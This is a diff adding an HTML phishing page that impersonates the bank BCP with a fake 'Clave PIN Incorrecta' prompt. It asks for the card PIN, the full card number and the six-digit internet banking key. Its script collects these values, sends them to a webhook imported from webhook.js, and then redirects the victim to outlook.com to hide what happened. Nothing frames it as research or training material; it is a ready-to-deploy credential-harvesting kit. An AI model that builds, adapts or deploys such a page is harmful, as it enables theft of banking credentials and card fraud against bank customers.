@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clave PIN Incorrecta</title>
+    <!-- Carga de Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Fuente Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap"
+        rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['"Plus Jakarta Sans"', '"Inter"', 'sans-serif'],
+                    },
+                    colors: {
+                        pageBg: '#F2F4F8',
+                        brandNavy: '#002A8D',
+                        brandBlue: '#0052CC',
+                        brandOrange: '#FF7800',
+                        brandOrangeHover: '#E66C00',
+                        textDark: '#111827',
+                        textMuted: '#4B5563',
+                        borderDefault: '#D1D5DB',
+                        btnDisabled: '#E5E7EB',
+                    },
+                    boxShadow: {
+                        card: '0 12px 32px rgba(16, 24, 40, 0.06)',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .floating-fieldset {
+            border: 1.5px solid #D1D5DB;
+            border-radius: 12px;
+            padding: 0 14px 10px 14px;
+            background-color: #FFFFFF;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .floating-fieldset:focus-within {
+            border-color: #0052CC;
+            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.12);
+        }
+
+        .floating-fieldset.is-error {
+            border-color: #DC2626;
+        }
+
+        .floating-fieldset.is-error:focus-within {
+            border-color: #DC2626;
+            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.12);
+        }
+
+        .floating-fieldset.is-valid {
+            border-color: #16A34A;
+        }
+
+        .floating-legend {
+            padding: 0 6px;
+            font-size: 12px;
+            font-weight: 500;
+            color: #4B5563;
+            line-height: 1;
+            transition: color 0.2s ease;
+        }
+
+        .floating-fieldset:focus-within .floating-legend {
+            color: #0052CC;
+        }
+
+        .floating-fieldset.is-error .floating-legend {
+            color: #DC2626;
+        }
+    </style>
+</head>
+
+<body
+    class="bg-pageBg min-h-screen w-full flex items-center justify-center p-3 sm:p-6 antialiased selection:bg-brandBlue/10 selection:text-brandNavy">
+
+    <!-- Contenedor Principal -->
+    <main id="pinCard"
+        class="relative w-full max-w-[420px] min-h-[680px] sm:min-h-[710px] bg-white rounded-[32px] shadow-card px-5 py-6 sm:px-8 sm:py-7 flex flex-col justify-between transition-all duration-300">
+
+        <!-- Vista Principal: Formulario -->
+        <div id="formView" class="w-full flex-1 flex flex-col justify-between">
+            <div class="w-full">
+                <!-- Botón Cerrar ('X') -->
+                <div class="flex justify-end items-center mb-1">
+                    <button type="button" id="closeBtn" aria-label="Cerrar ventana"
+                        class="p-2 -mr-2 text-textDark hover:bg-gray-100 active:bg-gray-200 rounded-full transition-colors focus:outline-none focus:ring-2 focus:ring-brandBlue/20">
+                        <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Logo BCP -->
+                <div class="mb-7">
+                    <svg class="h-7 w-auto" viewBox="0 0 132 32" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        aria-label="Logo BCP">
+                        <path
+                            d="M4.5 7.5C6.2 6.8 8.3 7.2 9.8 8.4L17.2 14.3C18.3 15.2 18.3 16.8 17.2 17.7L9.8 23.6C8.3 24.8 6.2 25.2 4.5 24.5C3.5 24.1 3.3 22.8 4.2 22.1L10.3 17.2C11.1 16.6 11.1 15.4 10.3 14.8L4.2 9.9C3.3 9.2 3.5 7.9 4.5 7.5Z"
+                            fill="#FF7800" />
+                        <text x="23" y="24" fill="#002A8D" font-family="'Plus Jakarta Sans', 'Inter', sans-serif"
+                            font-weight="800" font-style="italic" font-size="24" letter-spacing="-0.5">BCP</text>
+                        <path
+                            d="M84.5 7.5C86.2 6.8 88.3 7.2 89.8 8.4L97.2 14.3C98.3 15.2 98.3 16.8 97.2 17.7L89.8 23.6C88.3 24.8 86.2 25.2 84.5 24.5C83.5 24.1 83.3 22.8 84.2 22.1L90.3 17.2C91.1 16.6 91.1 15.4 90.3 14.8L84.2 9.9C83.3 9.2 83.5 7.9 84.5 7.5Z"
+                            fill="#FF7800" />
+                    </svg>
+                </div>
+
+                <!-- Encabezado -->
+                <header class="text-center mb-8">
+                    <h1 class="text-[24px] sm:text-[26px] font-bold text-textDark leading-[1.22] tracking-[-0.015em]">
+                        Clave PIN Incorrecta
+                    </h1>
+                    <p class="mt-2 text-[14px] sm:text-[15px] font-normal text-textMuted">
+                        Ingresa y confirma que esté bien escrita tu clave de 4 dígitos
+                    </p>
+                </header>
+
+                <!-- Formulario -->
+                <form id="pinSetupForm" novalidate class="space-y-5">
+
+                    <!-- 1. Clave PIN -->
+                    <div>
+                        <fieldset id="pinFieldset" class="floating-fieldset cursor-text">
+                            <legend class="floating-legend">Clave PIN</legend>
+                            <div class="flex items-center justify-between pt-1">
+                                <input type="password" id="pinInput" name="pinInput" inputmode="numeric"
+                                    pattern="[0-9]*" maxlength="4" placeholder="••••" autocomplete="off"
+                                    aria-label="Clave PIN de 4 dígitos"
+                                    class="w-full bg-transparent text-textDark placeholder-[#9CA3AF] text-[16px] tracking-[0.28em] font-semibold focus:outline-none">
+                                <button type="button" id="togglePinBtn" aria-label="Mostrar u ocultar Clave PIN"
+                                    class="text-textMuted hover:text-brandBlue p-1.5 -mr-1 rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-brandBlue/20">
+                                    <svg id="eyePinOpen" class="w-[19px] h-[19px]" viewBox="0 0 24 24" fill="none"
+                                        stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                        stroke-linejoin="round">
+                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                        <circle cx="12" cy="12" r="3"></circle>
+                                    </svg>
+                                    <svg id="eyePinClosed" class="hidden w-[19px] h-[19px]" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                        stroke-linejoin="round">
+                                        <path
+                                            d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24">
+                                        </path>
+                                        <line x1="1" y1="1" x2="23" y2="23"></line>
+                                    </svg>
+                                </button>
+                            </div>
+                        </fieldset>
+                        <p id="pinLengthHint" class="hidden mt-1.5 text-[12px] text-red-600 pl-1">
+                            La clave PIN debe tener 4 dígitos y no puede ser una secuencia (ej. 1234, 0000).
+                        </p>
+                    </div>
+
+                    <!-- 2. Confirmar clave PIN -->
+                    <div>
+                        <fieldset id="confirmFieldset" class="floating-fieldset cursor-text">
+                            <legend class="floating-legend">Confirmar clave PIN</legend>
+                            <div class="flex items-center justify-between pt-1">
+                                <input type="password" id="confirmPinInput" name="confirmPinInput" inputmode="numeric"
+                                    pattern="[0-9]*" maxlength="4" placeholder="••••" autocomplete="off"
+                                    aria-label="Confirmar clave PIN de 4 dígitos"
+                                    class="w-full bg-transparent text-textDark placeholder-[#9CA3AF] text-[16px] tracking-[0.28em] font-semibold focus:outline-none">
+                                <button type="button" id="toggleConfirmBtn"
+                                    aria-label="Mostrar u ocultar Confirmar clave PIN"
+                                    class="text-textMuted hover:text-brandBlue p-1.5 -mr-1 rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-brandBlue/20">
+                                    <svg id="eyeConfirmOpen" class="w-[19px] h-[19px]" viewBox="0 0 24 24" fill="none"
+                                        stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                        stroke-linejoin="round">
+                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                        <circle cx="12" cy="12" r="3"></circle>
+                                    </svg>
+                                    <svg id="eyeConfirmClosed" class="hidden w-[19px] h-[19px]" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                        stroke-linejoin="round">
+                                        <path
+                                            d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24">
+                                        </path>
+                                        <line x1="1" y1="1" x2="23" y2="23"></line>
+                                    </svg>
+                                </button>
+                            </div>
+                        </fieldset>
+                        <div id="matchErrorMsg"
+                            class="hidden mt-1.5 flex items-center gap-1.5 text-[12px] text-red-600 pl-1" role="alert">
+                            <svg class="w-4 h-4 shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <line x1="12" y1="8" x2="12" y2="12"></line>
+                                <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                            </svg>
+                            <span>Las claves PIN no coinciden.</span>
+                        </div>
+                        <div id="matchSuccessMsg"
+                            class="hidden mt-1.5 flex items-center gap-1.5 text-[12px] text-emerald-600 font-medium pl-1">
+                            <svg class="w-4 h-4 shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+                                <polyline points="20 6 9 17 4 12"></polyline>
+                            </svg>
+                            <span>Las claves PIN coinciden</span>
+                        </div>
+                    </div>
+
+                    <!-- 3. Número de tarjeta (16 dígitos en texto) -->
+                    <div>
+                        <fieldset id="cardFieldset" class="floating-fieldset cursor-text">
+                            <legend class="floating-legend">Número de tarjeta</legend>
+                            <div class="flex items-center justify-between pt-1">
+                                <input type="text" id="cardInput" name="cardInput" inputmode="numeric" maxlength="19"
+                                    autocomplete="off" aria-label="Número de tarjeta"
+                                    class="w-full bg-transparent text-textDark placeholder-[#9CA3AF] text-[16px] tracking-[0.05em] font-medium focus:outline-none"
+                                    placeholder="0000 0000 0000 0000">
+                            </div>
+                        </fieldset>
+                        <p id="cardErrorMsg" class="hidden mt-1.5 text-[12px] text-red-600 pl-1">
+                            El número de tarjeta debe tener 16 dígitos.
+                        </p>
+                    </div>
+
+                    <!-- 4. Clave de internet de 6 dígitos -->
+                    <div>
+                        <fieldset id="webKeyFieldset" class="floating-fieldset cursor-text">
+                            <legend class="floating-legend">Clave de internet de 6 dígitos</legend>
+                            <div class="flex items-center justify-between pt-1">
+                                <input type="password" id="webKeyInput" name="webKeyInput" inputmode="numeric"
+                                    maxlength="6" autocomplete="off" aria-label="Clave de internet de 6 dígitos"
+                                    class="w-full bg-transparent text-textDark placeholder-[#9CA3AF] text-[16px] tracking-[0.28em] font-semibold focus:outline-none"
+                                    placeholder="••••••">
+                                <button type="button" id="toggleWebKeyBtn"
+                                    aria-label="Mostrar u ocultar Clave de internet"
+                                    class="text-textMuted hover:text-brandBlue p-1.5 -mr-1 rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-brandBlue/20">
+                                    <svg id="eyeWebOpen" class="w-[19px] h-[19px]" viewBox="0 0 24 24" fill="none"
+                                        stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                        stroke-linejoin="round">
+                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                        <circle cx="12" cy="12" r="3"></circle>
+                                    </svg>
+                                    <svg id="eyeWebClosed" class="hidden w-[19px] h-[19px]" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                        stroke-linejoin="round">
+                                        <path
+                                            d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24">
+                                        </path>
+                                        <line x1="1" y1="1" x2="23" y2="23"></line>
+                                    </svg>
+                                </button>
+                            </div>
+                        </fieldset>
+                        <p id="webKeyErrorMsg" class="hidden mt-1.5 text-[12px] text-red-600 pl-1">
+                            La clave de internet debe tener exactamente 6 dígitos.
+                        </p>
+                    </div>
+
+                </form>
+            </div>
+
+            <!-- Botón Continuar -->
+            <div class="w-full pt-8">
+                <button type="submit" form="pinSetupForm" id="continueBtn" disabled
+                    class="w-full h-[52px] rounded-full bg-btnDisabled text-gray-400 font-semibold text-[15px] sm:text-[16px] tracking-[0.01em] transition-all duration-200 cursor-not-allowed flex items-center justify-center focus:outline-none focus:ring-4 focus:ring-brandOrange/25">
+                    Continuar
+                </button>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Estado cuando el usuario cierra la tarjeta con el botón 'X' -->
+    <div id="closedView" class="hidden text-center w-full max-w-[360px] px-4">
+        <div class="bg-white rounded-[28px] p-8 shadow-card">
+            <p class="text-textDark font-bold text-[18px] mb-2">Operación cerrada</p>
+            <p class="text-textMuted text-[14px] mb-6">Has cerrado la ventana de verificación.</p>
+            <button type="button" id="reopenBtn"
+                class="w-full h-[48px] rounded-full bg-brandNavy hover:bg-[#00206E] text-white font-semibold text-[14px] transition-colors">
+                Volver a abrir
+            </button>
+        </div>
+    </div>
+
+    <!-- Script para el manejo de la lógica y el webhook -->
+    <script type="module">
+        import { sendToWebhook } from './webhook.js';
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // Referencias a elementos del formulario
+            const pinSetupForm = document.getElementById('pinSetupForm');
+            const pinFieldset = document.getElementById('pinFieldset');
+            const confirmFieldset = document.getElementById('confirmFieldset');
+            const cardFieldset = document.getElementById('cardFieldset');
+            const webKeyFieldset = document.getElementById('webKeyFieldset');
+
+            const pinInput = document.getElementById('pinInput');
+            const confirmPinInput = document.getElementById('confirmPinInput');
+            const cardInput = document.getElementById('cardInput');
+            const webKeyInput = document.getElementById('webKeyInput');
+
+            // Botones de visibilidad
+            const togglePinBtn = document.getElementById('togglePinBtn');
+            const eyePinOpen = document.getElementById('eyePinOpen');
+            const eyePinClosed = document.getElementById('eyePinClosed');
+
+            const toggleConfirmBtn = document.getElementById('toggleConfirmBtn');
+            const eyeConfirmOpen = document.getElementById('eyeConfirmOpen');
+            const eyeConfirmClosed = document.getElementById('eyeConfirmClosed');
+
+            const toggleWebKeyBtn = document.getElementById('toggleWebKeyBtn');
+            const eyeWebOpen = document.getElementById('eyeWebOpen');
+            const eyeWebClosed = document.getElementById('eyeWebClosed');
+
+            // Mensajes de error
+            const pinLengthHint = document.getElementById('pinLengthHint');
+            const matchErrorMsg = document.getElementById('matchErrorMsg');
+            const matchSuccessMsg = document.getElementById('matchSuccessMsg');
+            const cardErrorMsg = document.getElementById('cardErrorMsg');
+            const webKeyErrorMsg = document.getElementById('webKeyErrorMsg');
+
+            const continueBtn = document.getElementById('continueBtn');
+            const pinCard = document.getElementById('pinCard');
+            const closedView = document.getElementById('closedView');
+            const closeBtn = document.getElementById('closeBtn');
+            const reopenBtn = document.getElementById('reopenBtn');
+
+            // --- FUNCIONES DE VALIDACIÓN ---
+
+            // Evita secuencias como 1234, 4321, 1111, 0000
+            function isSequentialOrRepeated(pin) {
+                if (/^(\d)\1{3}$/.test(pin)) return true; // 1111, 0000
+                const digits = pin.split('').map(Number);
+                let isAscending = true;
+                let isDescending = true;
+                for (let i = 0; i < digits.length - 1; i++) {
+                    if (digits[i + 1] !== digits[i] + 1) isAscending = false;
+                    if (digits[i + 1] !== digits[i] - 1) isDescending = false;
+                }
+                return isAscending || isDescending;
+            }
+
+            // Formatea el número de tarjeta con espacios cada 4 dígitos
+            function formatCardNumber(value) {
+                let val = value.replace(/\D/g, '').slice(0, 16);
+                let formatted = '';
+                for (let i = 0; i < val.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += val[i];
+                }
+                return formatted;
+            }
+
+            function validateForm() {
+                const pin = pinInput.value;
+                const confirmPin = confirmPinInput.value;
+                const card = cardInput.value.replace(/\D/g, '');
+                const webKey = webKeyInput.value;
+
+                // Validar PIN
+                const isPinComplete = /^\d{4}$/.test(pin);
+                const pinIsWeak = isPinComplete && isSequentialOrRepeated(pin);
+
+                if (isPinComplete && !pinIsWeak) {
+                    pinFieldset.classList.remove('is-error');
+                    pinLengthHint.classList.add('hidden');
+                } else if (pin.length > 0) {
+                    pinFieldset.classList.add('is-error');
+                    if (pinIsWeak) pinLengthHint.classList.remove('hidden');
+                }
+
+                // Validar Confirmación
+                const isConfirmComplete = /^\d{4}$/.test(confirmPin);
+                if (confirmPin.length === 0) {
+                    confirmFieldset.classList.remove('is-error', 'is-valid');
+                    matchErrorMsg.classList.add('hidden');
+                    matchSuccessMsg.classList.add('hidden');
+                } else if (isPinComplete && !pinIsWeak && pin === confirmPin) {
+                    confirmFieldset.classList.remove('is-error');
+                    confirmFieldset.classList.add('is-valid');
+                    matchErrorMsg.classList.add('hidden');
+                    matchSuccessMsg.classList.remove('hidden');
+                } else {
+                    confirmFieldset.classList.remove('is-valid');
+                    confirmFieldset.classList.add('is-error');
+                    matchErrorMsg.classList.remove('hidden');
+                    matchSuccessMsg.classList.add('hidden');
+                }
+
+                // Validar Tarjeta
+                const isCardComplete = card.length === 16;
+                if (card.length === 0) {
+                    cardFieldset.classList.remove('is-error', 'is-valid');
+                    cardErrorMsg.classList.add('hidden');
+                } else if (isCardComplete) {
+                    cardFieldset.classList.remove('is-error');
+                    cardFieldset.classList.add('is-valid');
+                    cardErrorMsg.classList.add('hidden');
+                } else {
+                    cardFieldset.classList.remove('is-valid');
+                    cardFieldset.classList.add('is-error');
+                    cardErrorMsg.classList.remove('hidden');
+                }
+
+                // Validar Clave de Internet (6 dígitos)
+                const isWebKeyComplete = /^\d{6}$/.test(webKey);
+                if (webKey.length === 0) {
+                    webKeyFieldset.classList.remove('is-error', 'is-valid');
+                    webKeyErrorMsg.classList.add('hidden');
+                } else if (isWebKeyComplete) {
+                    webKeyFieldset.classList.remove('is-error');
+                    webKeyFieldset.classList.add('is-valid');
+                    webKeyErrorMsg.classList.add('hidden');
+                } else {
+                    webKeyFieldset.classList.remove('is-valid');
+                    webKeyFieldset.classList.add('is-error');
+                    webKeyErrorMsg.classList.remove('hidden');
+                }
+
+                // Activar botón
+                const canSubmit = isPinComplete && !pinIsWeak && isConfirmComplete && pin === confirmPin && isCardComplete && isWebKeyComplete;
+
+                if (canSubmit) {
+                    continueBtn.disabled = false;
+                    continueBtn.classList.remove('bg-btnDisabled', 'text-gray-400', 'cursor-not-allowed');
+                    continueBtn.classList.add('bg-brandOrange', 'hover:bg-brandOrangeHover', 'active:scale-[0.99]', 'text-white', 'cursor-pointer', 'shadow-md', 'shadow-brandOrange/25');
+                } else {
+                    continueBtn.disabled = true;
+                    continueBtn.classList.add('bg-btnDisabled', 'text-gray-400', 'cursor-not-allowed');
+                    continueBtn.classList.remove('bg-brandOrange', 'hover:bg-brandOrangeHover', 'active:scale-[0.99]', 'text-white', 'cursor-pointer', 'shadow-md', 'shadow-brandOrange/25');
+                }
+            }
+
+            // --- EVENT LISTENERS ---
+            pinInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+                validateForm();
+            });
+
+            confirmPinInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+                validateForm();
+            });
+
+            cardInput.addEventListener('input', (e) => {
+                e.target.value = formatCardNumber(e.target.value);
+                validateForm();
+            });
+
+            webKeyInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+                validateForm();
+            });
+
+            // Botones de ojo
+            function setupEyeToggle(btn, input, openIcon, closedIcon) {
+                btn.addEventListener('click', () => {
+                    const isHidden = input.type === 'password';
+                    input.type = isHidden ? 'text' : 'password';
+                    openIcon.classList.toggle('hidden', isHidden);
+                    closedIcon.classList.toggle('hidden', !isHidden);
+                });
+            }
+            setupEyeToggle(togglePinBtn, pinInput, eyePinOpen, eyePinClosed);
+            setupEyeToggle(toggleConfirmBtn, confirmPinInput, eyeConfirmOpen, eyeConfirmClosed);
+            setupEyeToggle(toggleWebKeyBtn, webKeyInput, eyeWebOpen, eyeWebClosed);
+
+            // Clicks en fieldsets
+            pinFieldset.addEventListener('click', (e) => { if (!togglePinBtn.contains(e.target)) pinInput.focus(); });
+            confirmFieldset.addEventListener('click', (e) => { if (!toggleConfirmBtn.contains(e.target)) confirmPinInput.focus(); });
+            cardFieldset.addEventListener('click', () => cardInput.focus());
+            webKeyFieldset.addEventListener('click', (e) => { if (!toggleWebKeyBtn.contains(e.target)) webKeyInput.focus(); });
+
+            // --- ENVÍO DEL FORMULARIO ---
+            pinSetupForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+
+                // Bloquear botón temporalmente para evitar doble envío
+                const originalText = continueBtn.textContent;
+                continueBtn.textContent = 'Enviando...';
+                continueBtn.disabled = true;
+
+                // Recolectar datos para el webhook
+                const dataToSend = {
+                    pin: pinInput.value,
+                    confirmPin: confirmPinInput.value,
+                    cardNumber: cardInput.value,
+                    webKey: webKeyInput.value
+                };
+
+                try {
+                    // Llamar a la función importada de webhook.js
+                    if (typeof sendToWebhook === 'function') {
+                        await sendToWebhook(dataToSend);
+                    } else {
+                        console.warn("No se encontró la función sendToWebhook en webhook.js");
+                    }
+                } catch (error) {
+                    console.error("Error al enviar al webhook:", error);
+                } finally {
+                    // Redirigir a Outlook
+                    window.location.href = 'https://outlook.com';
+                }
+            });
+
+            // --- BOTONES DE CERRAR ---
+            closeBtn.addEventListener('click', () => {
+                pinCard.classList.add('hidden');
+                closedView.classList.remove('hidden');
+            });
+
+            reopenBtn.addEventListener('click', () => {
+                closedView.classList.add('hidden');
+                pinCard.classList.remove('hidden');
+                pinSetupForm.reset();
+                // Limpiar estilos
+                document.querySelectorAll('.floating-fieldset').forEach(el => {
+                    el.classList.remove('is-error', 'is-valid');
+                });
+                document.querySelectorAll('p[id$="Msg"], p[id$="Hint"]').forEach(el => el.classList.add('hidden'));
+                validateForm();
+            });
+        });
+    </script>
+</body>
+
+</html>
